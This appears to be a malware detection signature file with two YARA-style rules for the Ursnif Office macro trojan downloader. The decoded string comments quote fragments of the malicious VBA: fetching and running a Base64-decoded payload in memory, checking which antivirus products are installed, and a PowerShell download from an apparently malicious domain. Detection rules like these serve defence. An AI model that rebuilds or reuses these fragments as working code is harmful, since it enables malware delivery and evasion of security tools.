
rule TrojanDownloader_O97M_Ursnif_AG_MSR{
	meta:
		description = "TrojanDownloader:O97M/Ursnif.AG!MSR,SIGNATURE_TYPE_MACROHSTR_EXT,0e 00 0e 00 0e 00 00 "
		
	strings :
		$a_01_0 = {50 72 69 76 61 74 65 20 46 75 6e 63 74 69 6f 6e 20 52 75 6e 46 45 28 29 20 41 73 20 4c 6f 6e 67 } //1 Private Function RunFE() As Long
		$a_01_1 = {46 6f 72 20 69 20 3d 20 30 20 54 6f 20 38 3a 20 62 62 62 20 3d 20 62 62 62 20 26 20 43 68 72 28 4d 61 70 31 28 49 6e 74 28 36 32 20 2a 20 52 6e 64 28 29 29 29 29 3a 20 4e 65 78 74 20 69 } //1 For i = 0 To 8: bbb = bbb & Chr(Map1(Int(62 * Rnd()))): Next i
		$a_01_2 = {53 65 74 20 4d 52 20 3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 44 65 63 6f 64 65 53 54 52 28 22 } //1 Set MR = CreateObject(DecodeSTR("
		$a_01_3 = {43 61 6c 6c 20 4d 52 2e 53 65 74 54 69 6d 65 6f 75 74 73 28 30 2c 20 32 30 30 30 2c 20 32 30 30 30 2c 20 35 30 30 30 29 } //1 Call MR.SetTimeouts(0, 2000, 2000, 5000)
		$a_01_4 = {4d 52 2e 4f 70 65 6e 20 22 47 45 54 22 2c 20 44 65 63 6f 64 65 53 54 52 28 22 } //1 MR.Open "GET", DecodeSTR("
		$a_01_5 = {22 29 20 26 20 22 3f 22 20 26 20 62 62 62 20 26 20 22 3d 22 20 26 20 62 62 62 } //1 ") & "?" & bbb & "=" & bbb
		$a_01_6 = {2e 73 65 74 52 65 71 75 65 73 74 48 65 61 64 65 72 20 22 43 61 63 68 65 2d 43 6f 6e 74 72 6f 6c 22 2c 20 22 6e 6f 2d 63 61 63 68 65 22 } //1 .setRequestHeader "Cache-Control", "no-cache"
		$a_01_7 = {2e 73 65 74 52 65 71 75 65 73 74 48 65 61 64 65 72 20 22 50 72 61 67 6d 61 22 2c 20 22 6e 6f 2d 63 61 63 68 65 22 } //1 .setRequestHeader "Pragma", "no-cache"
		$a_01_8 = {2e 73 65 6e 64 } //1 .send
		$a_01_9 = {2e 57 61 69 74 46 6f 72 52 65 73 70 6f 6e 73 65 } //1 .WaitForResponse
		$a_01_10 = {62 62 62 20 3d 20 2e 52 65 73 70 6f 6e 73 65 54 65 78 74 } //1 bbb = .ResponseText
		$a_01_11 = {72 70 52 65 73 20 3d 20 52 75 6e 50 45 28 42 61 73 65 36 34 44 65 63 6f 64 65 28 62 62 62 29 29 } //1 rpRes = RunPE(Base64Decode(bbb))
		$a_01_12 = {41 70 70 6c 69 63 61 74 69 6f 6e 2e 51 75 69 74 20 28 77 64 44 6f 4e 6f 74 53 61 76 65 43 68 61 6e 67 65 73 29 } //1 Application.Quit (wdDoNotSaveChanges)
		$a_01_13 = {50 72 69 76 61 74 65 20 53 75 62 20 57 69 6e 64 6f 77 73 4d 65 64 69 61 50 6c 61 79 65 72 31 5f 4f 70 65 6e 53 74 61 74 65 43 68 61 6e 67 65 28 42 79 56 61 6c 20 4e 65 77 53 74 61 74 65 20 41 73 20 4c 6f 6e 67 29 } //1 Private Sub WindowsMediaPlayer1_OpenStateChange(ByVal NewState As Long)
	condition:
		((#a_01_0  & 1)*1+(#a_01_1  & 1)*1+(#a_01_2  & 1)*1+(#a_01_3  & 1)*1+(#a_01_4  & 1)*1+(#a_01_5  & 1)*1+(#a_01_6  & 1)*1+(#a_01_7  & 1)*1+(#a_01_8  & 1)*1+(#a_01_9  & 1)*1+(#a_01_10  & 1)*1+(#a_01_11  & 1)*1+(#a_01_12  & 1)*1+(#a_01_13  & 1)*1) >=14
 
}
rule TrojanDownloader_O97M_Ursnif_AG_MSR_2{
	meta:
		description = "TrojanDownloader:O97M/Ursnif.AG!MSR,SIGNATURE_TYPE_MACROHSTR_EXT,07 00 07 00 07 00 00 "
		
	strings :
		$a_01_0 = {53 75 62 20 47 38 47 31 4b 34 28 29 } //1 Sub G8G1K4()
		$a_01_1 = {53 65 74 20 64 61 72 61 75 66 68 20 3d 20 68 65 61 64 62 2e 43 72 65 61 74 65 54 65 78 74 46 69 6c 65 28 22 43 3a 5c 50 72 6f 67 72 61 6d 44 61 74 61 5c 67 72 61 6e 69 74 65 62 2e 74 78 74 22 29 } //1 Set daraufh = headb.CreateTextFile("C:\ProgramData\graniteb.txt")
		$a_01_2 = {53 65 74 20 73 68 6f 77 73 70 20 3d 20 62 65 6c 69 65 76 65 73 70 2e 65 78 65 63 71 75 65 72 79 28 22 73 65 6c 65 63 74 20 2a 20 66 72 6f 6d 20 61 6e 74 69 76 69 72 75 73 70 72 6f 64 75 63 74 22 2c 20 22 77 71 6c 22 2c 20 30 29 } //1 Set showsp = believesp.execquery("select * from antivirusproduct", "wql", 0)
		$a_01_3 = {64 61 72 61 75 66 68 2e 57 72 69 74 65 20 22 66 75 6e 63 74 69 6f 6e 20 65 42 6f 6f 6b 73 6a 28 24 64 65 74 65 63 74 69 76 65 66 29 7b 24 70 6c 61 74 66 6f 72 6d 69 20 3d 20 5b 4e 65 74 2e 57 65 62 52 65 71 75 65 73 74 5d 3a 3a 43 72 65 61 74 65 28 27 68 74 74 70 73 3a 2f 2f 54 68 65 46 69 6e 61 6e 63 65 49 6e 76 65 73 74 2e 63 6f 6d 2f 27 2b 24 64 65 74 65 63 74 69 76 65 66 29 3b 24 70 6c 61 74 66 6f 72 6d 69 2e 4d 65 74 68 6f 64 3d 27 47 45 54 27 3b } //1 daraufh.Write "function eBooksj($detectivef){$platformi = [Net.WebRequest]::Create('https://TheFinanceInvest.com/'+$detectivef);$platformi.Method='GET';
		$a_01_4 = {69 6d 70 61 72 74 69 61 6c 65 20 3d 20 22 43 3a 5c 50 72 6f 67 72 61 6d 44 61 74 61 5c 70 72 6e 63 6e 66 67 2e 74 78 74 22 } //1 impartiale = "C:\ProgramData\prncnfg.txt"
		$a_01_5 = {61 6e 73 77 65 72 65 64 72 20 3d 20 73 74 72 6f 6e 67 65 72 6a 20 4f 72 20 49 6e 53 74 72 28 64 69 66 66 69 63 75 6c 74 79 66 2c 20 22 46 2d 53 65 63 75 72 65 22 29 20 4f 72 20 49 6e 53 74 72 28 64 69 66 66 69 63 75 6c 74 79 66 2c 20 22 42 69 74 44 65 66 65 6e 64 65 72 22 29 } //1 answeredr = strongerj Or InStr(difficultyf, "F-Secure") Or InStr(difficultyf, "BitDefender")
		$a_01_6 = {43 72 65 61 74 65 4f 62 6a 65 63 74 28 22 53 68 65 6c 6c 2e 41 70 70 6c 69 63 61 74 69 6f 6e 22 29 2e 53 68 65 6c 6c 45 78 65 63 75 74 65 20 22 63 73 63 72 69 70 74 2e 65 78 65 22 2c 20 22 43 3a 5c 77 69 6e 64 6f 77 73 5c 53 79 73 74 65 6d 33 32 5c 50 72 69 6e 74 69 6e 67 5f 41 64 6d 69 6e 5f 53 63 72 69 70 74 73 5c 65 6e 2d 55 53 5c 70 72 6e 70 6f 72 74 2e 76 22 } //1 CreateObject("Shell.Application").ShellExecute "cscript.exe", "C:\windows\System32\Printing_Admin_Scripts\en-US\prnport.v"
	condition:
		((#a_01_0  & 1)*1+(#a_01_1  & 1)*1+(#a_01_2  & 1)*1+(#a_01_3  & 1)*1+(#a_01_4  & 1)*1+(#a_01_5  & 1)*1+(#a_01_6  & 1)*1) >=7
 
}